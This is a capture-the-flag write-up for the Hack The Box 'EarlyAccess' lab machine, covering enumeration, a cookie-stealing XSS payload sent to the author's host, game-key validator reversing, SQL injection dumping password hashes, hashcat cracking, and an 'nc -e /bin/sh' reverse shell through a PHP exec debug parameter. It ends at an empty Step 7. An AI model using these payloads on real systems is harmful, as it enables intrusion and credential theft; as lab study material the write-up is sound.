---
layout: single
title: EarlyAccess - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-09-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-earlyaccess/earlyaccess_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-earlyaccess/earlyaccess_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

# USER

### Step 1
Standard enum with nmap, dirb, nikto, ffuf.

__NMAP:__
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ nmap -Pn -n -sCV 10.10.11.110
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 12:29 CEST
Nmap scan report for 10.10.11.110
Host is up (0.027s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

__DIRB:__
```bash
┌──(void㉿void)-[~/Documents/scanners/linux]
└─$ dirb https://10.10.11.110                                                     

URL_BASE: https://10.10.11.110/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

---- Scanning URL: https://10.10.11.110/ ----
+ https://10.10.11.110/index.html (CODE:200|SIZE:406)
```

__NIKTO:__
```bash
┌──(void㉿void)-[~/Documents/scanners/linux]
└─$ nikto -h https://10.10.11.110
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.110
+ Target Hostname:    10.10.11.110
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb
+ Start Time:         2021-09-14 12:30:26 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
..
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Hostname '10.10.11.110' does not match certificate's names: earlyaccess.htb
+ Server banner has changed from 'nginx/1.14.2' to 'Apache/2.4.38 (Debian)' which may suggest a WAF, load balancer or proxy is in place
+ Retrieved x-powered-by header: PHP/7.4.21
+ Cookie XSRF-TOKEN created without the secure flag
+ Cookie XSRF-TOKEN created without the httponly flag
+ Cookie earlyaccess_session created without the secure flag
+ Cookie earlyaccess_session created without the httponly flag
```

__FFUF:__
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://earlyaccess.htb/ -H "Host: https://FUZZ.earlyaccess.htb" -fw 83
..
N/A

```

Using the different enum tools triggers the __WAF__ which bans us for 1 minute.
```html
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ curl -vk https://earlyaccess.htb                                               
..
> GET / HTTP/1.1
> Host: earlyaccess.htb
< HTTP/1.1 200 OK
<
<!DOCTYPE html>
<html>
<head>
<title>Banned</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
    <h1>You are banned!</h1>
    <body>
        Our WAF detected suspicious traffic coming from your IP! You are temporarily banned from accessing the webpage for one minute.
    </body>
</body>
</html>
```

Trying to bypass the _WAF_ using simple HTTP Headers still result in a temporary ban.
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://earlyaccess.htb/FUZZ -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1"
```

---------------------------------

### Step 2
Browsing through the website we find:
- chr0x6eos@earlyaccess.htb (from the SSL Cert)
- admin@earlyaccess.htb in the page footer
- We are able to register an account and login

Lets start by register an account, `test1@asd.as:123123123`. Reading through the Forums message board we find:

>Hello Game-Corp Team!
>
I have found a critical bug in the game-scoreboard.  
My username returns strange errors on the scoreboard. Please fix this issue!
>
Thanks, __SingleQuoteMan__
>>Hey SingleQuoteMan,
>>
Thank you for reaching out to us.  
Our internal team has already added this to our Bug-Tracker and is currently working on resolving this issue permanently. For now, a __temporary fix__ was issued that prevents creation of accounts with invalid usernames. (Your account is also affected by this change!)  
We are incredibly sorry for the inconvenience this has caused and will update you as soon as we have resolved this problem. Please feel welcome to reach out to us with any further questions you may as we would be more than happy to help.
>>
Take care, your Support-Team

Vulnerable name-field? Possible to do SQLi and/or XSS?

> I have recently bought an Early Access Game-Key from your store, however now that I am trying to register the key to my account I keep getting errors. This is the error I get: "Game-key is invalid! If this issue persists, please contact the admin!"
>>Hello 3lit3H4kr,
>>
Thank you for reaching out to us.  
Due to the high load of traffic our Game-Key verification-API is currently experiencing issues. We are implementing a solution to fallback to __manual verification__ by the support staff.  
Please __use the contact form__ to privately contact an administrative user and send the Game-Key for manual verification. We are incredibly sorry for the inconvenience this has caused you. We are doing our best to resolve this issue promptly.
>>
Take care, your Support-Team

Possible to steal an admin cookie through XSS? 
As both posts hints, I should probably play around with the `name` field in the profile settings in order to steal an admin cookie. 

`Name: <script>var i=new Image;i.src="https://10.10.14.2/?"+document.cookie;</script>`

![[earlyaccess-01.png]]

Send an mail using the website contact form, setup a listener and wait for incoming cookie.

```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ nc -lvnp 443                                                                                                                  1 ⨯
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.110] 46374
?Kz�+ٖ0� [���踎Ml4f���I��Uk��P	r�j ���+�/�,�0̨̩����/5����

jj
  #
3+)jj �Ξ�N��D���|��ŭ���κ����1-+

��
  ih2**�  
```

The message seems to be encrypted. We probably need to setup a __HTTPS__ server in order to grab the cookie.

```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ sudo python3 simple-https-server.py
10.10.11.110 - - [14/Sep/2021 16:08:30] "GET /?XSRF-TOKEN=eyJpdiI6InNmd2VuaEpxMXI5aWQvNzNpajRvQkE9PSIsInZhbHVlIjoicGhXcjM3dnhrc2JPNFVwLzRzSWUxRU0zMGp0TTl1MW9xQXdYKzdRRXZ2MFMrcVlBSUhZZjdxTWQvLytQRE1MdlVHYnh4VEtKbXdQMzUzMldsVjNLSEsxM3dvM3hVYmRzVHI1cnliQXlsK29WY0JaN0hzMEthVlBrSXF5Q0VBSVkiLCJtYWMiOiJkYzY5MGIxZTY3Zjk5YzM2MmQ3OWViNGVhODRmNDJkM2NkMmQwMDhlMzQ2Y2NkNDBjZTdmM2VkMGQzZjcxZTAxIn0%3D;%20earlyaccess_session=eyJpdiI6IjZ1ZWpFdlhBL0xQcHdFanRmTkM5aFE9PSIsInZhbHVlIjoiQ3Z0M0RwdExoZ1VqblhOWWMyTHNQa1d1aVczdVQvdnNRNk5ac0txTGF3Nkw4YmpGVDRxUmp0Q2l6NFY1Z1Jmcm5MVk44d0pXdFJWYWNzck8xQW1pRXpPTGl3dHdub0d6YzBUN2xqa21qbnpONkdVaHFjd2dQTngzZzRMWVl1Q1EiLCJtYWMiOiJjOTJkYmI2ODU4MzYyOTFhMWNiNjVjYjE0YTVkZDQ2NDc4ZGJlY2MzYTY0MzAwMGZiNzZlZTFjYjE3YTYyYzUzIn0%3D HTTP/1.1" 200 -
```

Change the `XSRF-TOKEN` and `earlyaccess_session` in the browser, update and we are now admin! 

![[earlyaccess-02.png]]

---------------------------------

### Step 3

Both the `Dev` and `Game` vhost seems to be locked behind additional authentication at this stage, however from `Admin` we are able to download a backup file to validate game keys. Looking through each line of the code we should be able to reverse the script and thus get a valid key. 

__First section__ checks if key is in valid format (ex. AAAAA-BBBBB-CCCC1-DDDDD-1234)
```python
def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))
```

__Second section__ strips the fifth (last) group of the key, and calculates the combined ASCII Decimal value of group 1,2,3 and 4. The last, stripped, group will be used at a later stage as a checksum for verification - comparing to the combined value.
```python
def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])
```
```python
>>> a = "AAAAA-BBBBB-CCCC1-DDDDD-1234"
>>> b = a.split('-')[:-1]
>>> print(b)
['AAAAA', 'BBBBB', 'CCCC1', 'DDDDD']
>>> print(sum([sum(bytearray(g.encode())) for g in b]))
1312
```

__Third section (first group)__ calculates that the value of the three first letters of the key to spell out __K E Y__, the fourth and fifth character is checked to see if it's an integer and lastly the length is checked before moving to next function. 

Valid first group could be: __KEY01__
```python
def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)
```
```python
>>> g1 = "KEY01"
>>> r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
>>> print(r)
[221, 81, 145]
>>> print(g1[3])
0
>>> print(len(set(g1)))
5
>>> print(len(g1))
5
```

__Forth section (second group)__ divides the key in two parts, p1 containing character 1,3 and 5 of the key, and p2 containing character 2 and 4. The sum function calculates the ASCII decimal value of p1 and p2, and then compares them to each other. p1 and p2 must be equal to pass as valid.

Valid second group could be: __1J1I1__
```python
def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```
```python
>>> g2 = "12345"
>>> p1 = g2[::2]
>>> print(p1)
135
>>> p2 = g2[1::2]
>>> print(p2)
24
```
```python
>>> p1 = "1"
>>> print(p1.encode())
b'1'
>>> print(sum(p1.encode()))
49
>>> 49*3
147
>>> p2 = "J"
>>> print(p2.encode())
b'J'
>>> print(sum(p2.encode()))
74
```
```python
>>> g2 = "1J1I1"
>>> p1 = g2[::2]
>>> p2 = g2[1::2]
>>> print(sum(bytearray(p1.encode())))
147
>>> print(sum(bytearray(p2.encode())))
147
```

__Fifth section (third group)__ checks if the first two characters of the groups are equal to `magic_value` which is statically assigned to `XP`, at the start of the code. If the first check passes, then the whole group is check to see if it's total decimal value (`sum`) is equal to `magic_num`, which is statically assigned to `346`, at the start of the code. 

The ASCII decimal value of XP is 168, meaning our three remaining characters should have a combined value of 178.

Keep note that third group needs to follow the format: `[A-Z]{4}[0-9]`

Valid third group could be: __XPAA0__
```python
def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False
```
```python
>>> g3 = "12345"
>>> print(g3[0:2])
12
>>> start = "XP"
>>> print(sum(start.encode()))
168
>>> 346-168
178
>>> end = "AA0"
>>> print(sum(end.encode()))
178
```

__Sixth section (fourth group)__ compares the first group with the fourth group, character by character, converts it to ASCII decimal and calculates the mod value of the two. The mod value must be equal to `12, 4, 20, 117, 0`.

Valid fourth group could be: __GAME1__
```python
def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
```
```python
>>> print(ord("K"))
75
>>> print(ord("G"))
71
>>> print(ord("K")^ord("G"))
12
```
```python
>>> print(ord("E"))
69
>>> print(ord("A"))
65
>>> print(ord("E")^ord("A"))
4
```
```python
>>> print(ord("Y"))
89
>>> print(ord("M"))
77
>>> print(ord("Y")^ord("M"))
20
```
```python
>>> print(ord("0"))
48
>>> print(ord("E"))
69
>>> print(ord("0")^ord("E"))
117
```
```python
>>> print(ord("1")^ord("1"))
0
```

__Checksum verification (fifth group)__ is done by comparing the combined ASCII decimal sum of the four first groups, compared to the value of the fifth group. 

```python
def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])

def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs
```
```python
>>> key = "KEY01-1J1I1-XPAA0-GAME1-1301"
>>> gs = key.split('-')[:-1]
>>> print(gs)
['KEY01', '1J1I1', 'XPAA0', 'GAME1']
>>> print(sum([sum(bytearray(g.encode())) for g in gs]))
1301
>>> cs = int(key.split('-')[-1])
>>> print(cs)
1301

```

A valid key should be: __KEY01-1J1I1-XPAA0-GAME1-1301__

Testing it out, and we've reversed a key!
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ python3 validate.py KEY01-1J1I1-XPAA0-GAME1-1301
Entered key is valid!
```

---------------------------------

### Step 4
Even though the key is correct in our offline validator, it fails when validating it online. This probably have something to do with this.
>Since the API has been down a lot lately, we have come up with an temporary solution. As requested, an offline backup of the game-key validator algorithm is now available to all administrative users. To use this, the magic_num must be entered into the validator app.

And in the code we find:
`magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)`

![[earlyaccess-03.png]]

We need to find a way to extract the `magic_num` value from the API, or by other means. 
After trying to find and/or extract the `magic_num` for a while without success, I decided to go the scripting route and brute force all possible keys. The unknown variable only affects two characters in the third group, plus the last checksum group of the key.

```python
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ cat m.py 
#!/usr/bin/env python3

num = 955                   # Ascii decimal value of group 1,2,4
valid_key = "KEY01-1J1I1-XPAA0-GAME1-1301"
g1 = valid_key.split('-')[0]
g2 = valid_key.split('-')[1]
g3 = valid_key.split('-')[2]
g4 = valid_key.split('-')[3]
g5 = valid_key.split('-')[4]

g3_a = ['X', 'P', 'A', 'A', '0']
g32 = ord('A')

while g32 <= ord('Z'):
    
    g33 = ord('A')
    while g33 <= ord('Z'):
        g3_a[3] = chr(g33)
        magic_num = (ord(g3_a[0]) + ord(g3_a[1]) + ord(g3_a[2]) + ord(g3_a[3]) + ord(g3_a[4]))
        checksum = magic_num + num
        print(f"{g1}-{g2}-XP{g3_a[2]}{g3_a[3]}0-{g4}-{checksum}")
        g33 +=1

    g3_a[2] = chr(g32)
    g32 +=1
```
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ sudo python3 m.py               
KEY01-1J1I1-XPAA0-GAME1-1301
KEY01-1J1I1-XPAB0-GAME1-1302
KEY01-1J1I1-XPAC0-GAME1-1303
KEY01-1J1I1-XPAD0-GAME1-1304
KEY01-1J1I1-XPAE0-GAME1-1305
KEY01-1J1I1-XPAF0-GAME1-1306
KEY01-1J1I1-XPAG0-GAME1-1307
KEY01-1J1I1-XPAH0-GAME1-1308
KEY01-1J1I1-XPAI0-GAME1-1309
KEY01-1J1I1-XPAJ0-GAME1-1310
..
```
```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ wc -l all_keys.txt 
676 all_keys.txt
```

The script successfully brute forced 676 possible valid keys, depending on what the `magic_num` variable is set to. Fire up Burp, and brute force using intruder (remember to follow redirects).

Out of the 676 total keys we get __11__ keys that pass as valid! However nothing really happens.
![[earlyaccess-04.png]]

Trying to brute force a key as a user (`p3test@test.se:123123123`) however gives us access to the `Game` tab in the page header.

---------------------------------

### Step 5

Press the tab and login to https://game.earlyaccess.htb with your account. In the Global Leaderboard we find three users:
- chr0x6eos@earlyaccess.htb
- farbs@earlyaccess.htb
- firefart@earlyaccess.htb

On the `Scoreboard` we can see our own results. In __step 2__ we found a clue that the scoreboard would break to SQL input, so if we change our username to `'` and visit the scoreboard again we get the output:

>**Error**
>
>SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') ORDER BY scoreboard.score DESC LIMIT 11' at line 1

Trying to understand the query it probably looks something like this:
`select from game where username=('dude') ORDER BY scoreboard.score DESC LIMIT 11`

To input only `'` as user wouldn't make sense in that query, we probably need to close of the parenthesis first and then do our injection. 
Changing the username to `') order by 4;-- -#` gives us the error:
>**Error**
>
>SQLSTATE[42S22]: Column not found: 1054 Unknown column '4' in 'order clause'

Meaning the number of columns is 3 (as order by 3 gives no output). Enumerate the database using `') union all select RANDOM-SQL-COMMAND,2,3;-- -#`.

| Command			| Output			|
| ----------------- | ----------------- |
| @@version			| 8.0.25 			|
| user()			| game@172.18.0.102	|
| database()		| db				|
| table_name FROM information_schema.TABLES WHERE table_schema='db' | failed_logins, scoreboard, users |
| column_name FROM information_schema.COLUMNS WHERE table_name='users' | id, name, email, password, role, key, created_at, updated_at |
| concat(name,0x3a,password),2,3 FROM users | admin:618292e936625aca8df61d5fff5c06837c49e491 chr0x6eos:d997b2a79e4fc48183f59b2ce1cee9da18aa5476 firefart:584204a0bbe5e392173d3dfdf63a322c83fe97cd farbs:290516b5f6ad161a86786178934ad5f933242361 |

Add all the hashes to a file and crack them using hashcat.

```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ cat hashes.hash 
618292e936625aca8df61d5fff5c06837c49e491
d997b2a79e4fc48183f59b2ce1cee9da18aa5476
584204a0bbe5e392173d3dfdf63a322c83fe97cd 
290516b5f6ad161a86786178934ad5f933242361
   
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ echo -n 618292e936625aca8df61d5fff5c06837c49e491 | wc -c      
40
   
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ hashcat -a0 -m100 hashes.hash /usr/share/wordlists/rockyou.txt
..
618292e936625aca8df61d5fff5c06837c49e491:gameover
Approaching final keyspace - workload adjusted.  
                         
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: SHA1
Hash.Target......: hashes.hash
```

Cracked creds = __admin:gameover__

---------------------------------

### Step 6

We are now able to login on http://dev.earlyaccess.htb using the cracked admin creds.

There are two tools, Hashing- and File-Tools. The hashing tool allows us to make a MD5 or SHA1 hash of a password. Capturing the request we see a POST to `/actions/hash.php`.

Looking on the File-Tool however there are no UI available, but applying the same logic the request should be made to `/actions/file.php`.

```bash
┌──(void㉿void)-[~/Documents/shells/php]
└─$ curl http://dev.earlyaccess.htb/actions/file.php                               
<h1>ERROR:</h1>Please specify file!                                                                                                                                      
┌──(void㉿void)-[~/Documents/shells/php]
└─$ curl http://dev.earlyaccess.htb/actions/file.php?file=/etc/passwd
<h1>ERROR:</h1>Please specify file!                                                                                                                    
┌──(void㉿void)-[~/Documents/shells/php]
└─$ curl http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd
<h1>ERROR:</h1>For security reasons, reading outside the current directory is prohibited!
```

We got __RFI__, however we're not allowed to read outside the current directory. 

```php
┌──(void㉿void)-[~/Documents/shells/php]
└─$ curl -v http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php
<h2>Executing file:</h2><p>hash.php</p><br><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in <b>/var/www/earlyaccess.htb/dev/actions/hash.php</b> on line <b>77</b><br />
* Connection #0 to host dev.earlyaccess.htb left intact
<h2>Executed file successfully!
```

The warning message shows the absolute path: __/var/www/earlyaccess.htb/dev/actions/__
Playing around further with the RFI we can see that the function used in the File-Tool is __require_once()__:
```php
<b>Fatal error</b>:  require_once(): Failed opening required '\\10.10.14.2\share\rev.php' (include_path='.:.') in <b>/var/www/earlyaccess.htb/dev/actions/file.php</b> on line <b>19</b>```
```

Reading on HackTricks:
>The vulnerability (LFI/RFI) occurs when the user can control in some way the file that is going to be load by the server.
>
Vulnerable **PHP functions**: require, __require_once__, include, include_once

After some research I come across `php://filter/convert.base64-encode/resource=`, we can use this to extract hash.php in order to see if there's anything that we've missed.

```bash
┌──(void㉿void)-[~/Documents/shells/php]
└─$ curl http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php
<h2>Executing file:</h2><p>php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php</p><br>PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXNoX2Z1bmN0aW9uLCAkcGFzc3dvcmQpCnsKICAgIC8vIERFVkVMT1BFUi1OT1RFOiBUaGVyZSBoYXMgZ290dGEgYmUgYW4gZWFzaWVyIHdheS4uLgogICAgb2Jfc3RhcnQoKTsKICAgIC8vIFVzZSBpbnB1dHRlZCBoYXNoX2Z1bmN0aW9uIHRvIGhhc2ggcGFzc3dvcmQKICAgICRoYXNoID0gQCRoYXNoX2Z1bmN0aW9uKCRwYXNzd29yZCk7CiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pKQogICAgewogICAgICAgIGlmKCRfUkVRVUVTVFsnYWN0aW9uJ10gPT09ICJ2ZXJpZnkiKQogICAgICAgIHsKICAgICAgICAgICAgLy8gVkVSSUZJRVMgJHBhc3N3b3JkIEFHQUlOU1QgJGhhc2gKCiAgICAgICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ2hhc2gnXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydwYXNzd29yZCddKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gT25seSBhbGxvdyBjdXN0b20gaGFzaGVzLCBpZiBgZGVidWdgIGlzIHNldAogICAgICAgICAgICAgICAgaWYoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10gIT09ICJtZDUiICYmICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAic2hhMSIgJiYgIWlzc2V0KCRfUkVRVUVTVFsnZGVidWcnXSkpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiT25seSBNRDUgYW5kIFNIQTEgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQhIik7CgogICAgICAgICAgICAgICAgJGhhc2ggPSBoYXNoX3B3KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddLCAkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pOwoKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsndmVyaWZ5J10gPSAoJGhhc2ggPT09ICRfUkVRVUVTVFsnaGFzaCddKTsKICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9ob21lLnBocD90b29sPWhhc2hpbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gInZlcmlmeV9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUgVkVSSUZJQ0FUSU9OCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkX1JFUVVFU1RbJ2FjdGlvbiddID09PSAiaGFzaF9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUtSEFTSElORwogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gImhhc2giKQogICAgICAgIHsKICAgICAgICAgICAgLy8gSEFTSEVTICRwYXNzd29yZCBVU0lORyAkaGFzaF9mdW5jdGlvbgoKICAgICAgICAgICAgaWYoaXNzZXQoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIE9ubHkgYWxsb3cgY3VzdG9tIGhhc2hlcywgaWYgYGRlYnVnYCBpcyBzZXQKICAgICAgICAgICAgICAgIGlmKCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAibWQ1IiAmJiAkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSAhPT0gInNoYTEiICYmICFpc3NldCgkX1JFUVVFU1RbJ2RlYnVnJ10pKQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIk9ubHkgTUQ1IGFuZCBTSEExIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkISIpOwoKICAgICAgICAgICAgICAgICRoYXNoID0gaGFzaF9wdygkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSwgJF9SRVFVRVNUWydwYXNzd29yZCddKTsKICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkX1JFUVVFU1RbJ3JlZGlyZWN0J10pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlJlc3VsdCBmb3IgSGFzaC1mdW5jdGlvbiAoIiAuICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddIC4gIikgYW5kIHBhc3N3b3JkICgiIC4gJF9SRVFVRVNUWydwYXNzd29yZCddIC4gIik6PGJyPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyPicgLiAkaGFzaDsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydoYXNoJ10gPSAkaGFzaDsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaG9tZS5waHA/dG9vbD1oYXNoaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgLy8gQWN0aW9uIG5vdCBzZXQsIGlnbm9yZQogICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiIik7Cn0KY2F0Y2goRXhjZXB0aW9uICRleCkKewogICAgaWYoJGV4LT5nZXRNZXNzYWdlKCkgIT09ICIiKQogICAgICAgICRfU0VTU0lPTlsnZXJyb3InXSA9IGh0bWxlbnRpdGllcygkZXgtPmdldE1lc3NhZ2UoKSk7CgogICAgaGVhZGVyKCdMb2NhdGlvbjogL2hvbWUucGhwJyk7CiAgICByZXR1cm47Cn0KPz4=<h2>Executed file successfully! 
```

Decode the base64 to a file locally, in my case called hash.php.
Analyzing the code we see that there's a hidden debug feature available. Playing around with it for a while I came up with this Burp Request to give a reverse shell:
```php
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=077385c1956824d448397907ce455397
Upgrade-Insecure-Requests: 1

action=hash&redirect=true&password=nc -e /bin/sh 10.10.14.2 4488&hash_function=exec&debug=1
```
```bash
┌──(void㉿void)-[~/Documents/shells/php]
└─$ nc -lvnp 4488                                                                                                                  1 ⨯
listening on [any] 4488 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.110] 34528
id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
webserver
```

---------------------------------

### Step 7

